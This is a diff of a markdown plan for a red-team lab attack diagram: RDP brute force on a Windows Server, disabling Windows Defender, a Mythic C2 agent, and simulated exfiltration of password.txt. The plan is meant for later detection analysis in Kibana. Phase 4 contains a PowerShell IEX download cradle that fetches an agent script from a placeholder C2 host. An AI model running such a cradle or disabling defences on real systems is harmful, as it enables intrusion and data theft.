@@ -1,5 +1,5 @@
 
-## 1. Introduction
+## Introduction
 
 Goal: Create an attack diagram that outlines the sequence of actions taken to compromise a target Windows Server, establish a C2 connection, and exfiltrate data. The diagram will be used as a visual plan for simulating and analyzing the attack.
 
@@ -7,7 +7,7 @@ Tool: draw.io (for creating the diagram)
 
 ---
 
-## 2. Components of the Diagram
+## Components of the Diagram
 
 ![https://www.drawio.com/assets/img/blog/threat-modelling-process-flow.png](https://www.drawio.com/assets/img/blog/threat-modelling-process-flow.png)
 
@@ -41,7 +41,7 @@ Tool: draw.io (for creating the diagram)
 
 ---
 
-## 3. Attack Phases
+## Attack Phases
 
 ### Phase 1: Initial Access
 
@@ -68,7 +68,6 @@ Tool: draw.io (for creating the diagram)
 - The attacker disables Windows Defender to bypass security controls.
 - Command executed within the RDP session.
 - Purpose: Prevent security tools from blocking the next steps.
-    
 
 ---
 
@@ -79,53 +78,39 @@ Tool: draw.io (for creating the diagram)
     `IEX (New-Object Net.WebClient).DownloadString('http://<C2_SERVER>/agent.ps1')`
     
 - Goal: Install the agent and prepare for C2 communication.
-    
 
 ---
 
 ### Phase 5: Command and Control (C2)
 
 - The agent establishes a persistent connection back to the Mythic C2 server.
-    
 - The attacker now has remote command execution and monitoring capabilities on the target machine.
-    
 
 ---
 
 ### Phase 6: Exfiltration
 
 - The attacker simulates data theft by downloading a file (e.g., `password.txt`) from the target machine’s Documents folder through the C2 channel.
-    
 - This phase completes the full attack chain from initial access to data exfiltration.
-    
 
 ---
 
-## 4. Final Attack Flow Summary
+## Final Attack Flow Summary
 
 1. Attacker (Kali Linux) → Brute forces RDP credentials on Windows Server.
-    
 2. Attacker logs into Windows Server.
-    
 3. Attacker runs discovery commands to learn about the environment.
-    
 4. Attacker disables Windows Defender for evasion.
-    
 5. Attacker uses PowerShell to download and execute Mythic agent.
-    
 6. Mythic agent connects to C2 server.
-    
 7. Attacker downloads `password.txt` as simulated exfiltration.
-    
 
 ---
 
-## 5. Outcome and Next Steps
+## Outcome 
 
 - This diagram serves as a structured attack plan for future red team simulations.
-    
 - The attack steps can later be correlated with log data in Kibana to analyze detection and response capabilities.
-    
-- In the upcoming steps, the Mythic server will be set up to establish and manage the C2 channel.
+
 **Reference**
 https://youtu.be/jv-qiugJGHg?si=ZhkVu0mDS1YYAhDu
